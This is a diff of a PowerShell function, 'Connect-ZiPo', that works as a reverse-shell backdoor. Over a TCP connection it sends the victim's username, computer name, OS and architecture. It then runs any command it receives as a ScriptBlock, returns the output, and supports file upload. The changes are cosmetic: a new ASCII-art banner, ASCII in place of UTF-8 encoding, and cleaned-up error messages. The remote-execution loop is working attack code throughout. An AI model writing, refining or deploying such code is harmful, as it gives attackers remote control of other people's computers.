@@ -23,34 +23,31 @@ function Connect-ZiPo {
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # ANSI-цвета и баннер
+            # Очистка + баннер
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
 ${esc}[31m
-  __/\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\______/\\\\\\\\\\\\\\\___        
-   _\/\\\///////////____\/\\\///////////_____/\\\///////////__         
-    _\/\\\_______________\/\\\_______________\//\\\______        
-     _\/\\\\\\\\\\\_______\/\\\\\\\\\\\________\////\\\______      
-      _\/\\\///////________\/\\\///////____________\////\\\____       
-       _\/\\\_______________\/\\\_____________________\////\\\__      
-        _\/\\\_______________\/\\\______________/\\\______\//\\\_     
-         _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
-          _\///________________\///////////////____\///////////____${esc}[0m
-
-${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+  ________  .__              __________                .___           
+  \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
+   |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \
+   |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
+  /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
+          \/        \/\/                                      \/    \/ 
+${esc}[32m
+[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
-------------------------------------------------------------
+Architecture: $env:PROCESSOR_ARCHITECTURE
+---------------------------------------------------${esc}[0m
 "@
 
             $intro = $clear + $banner + "`nPS " + (Get-Location) + "> "
-            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
+            $bbytes = [Text.Encoding]::ASCII.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
 
             while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
-                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()
+                $cmd = ([Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
 
                 try {
                     if ($cmd.StartsWith("!upload")) {
@@ -67,16 +64,17 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     else {
                         $sb = [ScriptBlock]::Create($cmd)
-                        $output = & $sb 2>&1 | Out-String
-                        $response = $output.TrimEnd()
+                        $result = & $sb 2>&1 | Out-String
+                        $response = $result.TrimEnd()  # убираем лишние переносы
                     }
                 }
                 catch {
-                    $response = "[ERROR] $($_.Exception.Message)"
+                    $msg = $_.Exception.Message -replace '[^\x20-\x7E]', ''
+                    $response = "[ERROR] " + $msg
                 }
 
                 $response += "`nPS " + (Get-Location) + "> "
-                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
+                $outBytes = [Text.Encoding]::ASCII.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
                 $stream.Flush()
             }
